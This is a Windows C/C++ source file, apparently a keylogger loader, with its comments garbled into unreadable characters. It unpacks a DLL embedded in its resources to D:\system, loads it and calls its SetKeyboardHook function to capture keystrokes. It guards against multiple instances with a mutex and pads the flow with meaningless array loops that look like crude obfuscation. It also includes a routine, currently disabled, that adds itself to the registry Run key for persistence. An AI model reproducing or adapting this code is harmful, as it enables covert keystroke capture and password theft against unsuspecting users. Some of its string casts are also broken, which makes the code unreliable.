#include <Windows.h>
#include "resource.h"

#ifdef __cplusplus

#define IMPORT extern "C" __declspec (dllimport)

#else

#define IMPORT __declspec (dllimport)

#endif // __cplusplus

typedef BOOL(*SETKEYBOARDHOOK)(void);

/****************************************
	��������� �� ���� DLL
****************************************/
void UploadDLL(void)
{
	HMODULE hMod = GetModuleHandle(NULL);
	HRSRC   hRes = FindResource(hMod, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	HGLOBAL hGlob = LoadResource(hMod, hRes);
	BYTE* lpbAray = (BYTE*)LockResource(hGlob);
	DWORD dwSize = SizeofResource(hMod, hRes);

	DWORD	NOfBytes;
	BOOL cdir = CreateDirectory(L"D:\\system", NULL);
	HANDLE hFile = CreateFile(L"D:\\system\\mydll_cp.dll", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	WriteFile(hFile, lpbAray, dwSize, &NOfBytes, nullptr);
	CloseHandle(hFile);
}

/***********************************************
	��������� � ����������
***********************************************/
void Registry(void)
{
	HKEY    hKey = HKEY_LOCAL_MACHINE;
	LPCTSTR lpSubKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	DWORD   dwType = REG_SZ;
	HKEY    key;

	/* 1 - ����� ������������ ������� �������
	   2 - ����� ����� ������������ ����������
	   3 - ��������������
	   4 - ����� ������� ������������
		   KEY_WRITE ����� ��������� �������� � ������������ ������
	   5 - ����� ��������� ������� */
	RegOpenKeyEx(hKey, lpSubKey, 0, KEY_WRITE, &key);

	char pfad[MAX_PATH];

	/* 1 - ���������� ������ ��� ���� �� ����� ������.
		   ���� NULL �-� ��������� ���� �������� ������
	   2 - ��������� �� ����� ������� ����� ��������� ������ � ������ ����� ������
	   3 - ������ ������ */
	GetModuleFileName(NULL, (LPWSTR)pfad, MAX_PATH);

	/* 1 - ����� ��������� ������� � �������� ����������� ��������
	   2 - ��� ������������������ ��������
	   3 - ��������������
	   4 - ���������� ��� ���������� ������� ����� �������� � �������� ������
		   REG_SZ ������ �������������� �����
	   5 - ��������� �� ������ ��� ��������� �� �� ���������� ����� ��������
	   6 - ���������� ������ ������ �� ������� ��������� 5 �������� */
	RegSetValueEx(key, L"MyProgramm", 0, REG_SZ, (LPBYTE)pfad, (strlen(pfad) + 1));
}

/***********************************************
	��������� �������� �� ��� �����
***********************************************/
BOOL Mutex(LPCSTR szName)
{
	HANDLE hMutex = CreateMutex(NULL, TRUE, (LPCWSTR)szName);

	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CloseHandle(hMutex);

		return FALSE;
	}

	return TRUE;
}

void generateArray(int *A)
{
	for (int i = 0; i < 100; ++i)
	{
		A[i] = (i + 46) - 7;
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int NcmdShow)
{
	if (!Mutex((LPCSTR)"test"))
	{
		return 1;   // ���� ����� ��� �c�� �����������
	}
	//Registry();  // ���������� � ����������

	int B[100];
	generateArray(B);

	HINSTANCE hDll = NULL;
	DWORD err;

	for (int i = 0; i < 100; ++i)
	{
		if (B[i] % 2 == 0)
		{
			hDll = LoadLibrary((LPCWSTR)"D:\\system\\mydll_cp.dll");
			err = GetLastError();

			if (err != NULL)
			{
				UploadDLL();
				hDll = LoadLibrary(L"D:\\system\\mydll_cp.dll");
			}

			break;
		}
	}

	SETKEYBOARDHOOK SetKeyboardHook = NULL;
	
	for (int j = 0; j < 100; ++j)
	{
		if ((B[j] * 3) % 2 == 0)
		{
			SetKeyboardHook = (SETKEYBOARDHOOK)GetProcAddress(hDll, "SetKeyboardHook");
		
			break;
		}
	}

	for (int k = 0; k < 100; ++k)
	{
		if ( (B[k] * 6) > 50 )
		{
			SetKeyboardHook();
		}

		break;
	}

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	FreeLibrary(hDll);
	return 0;
}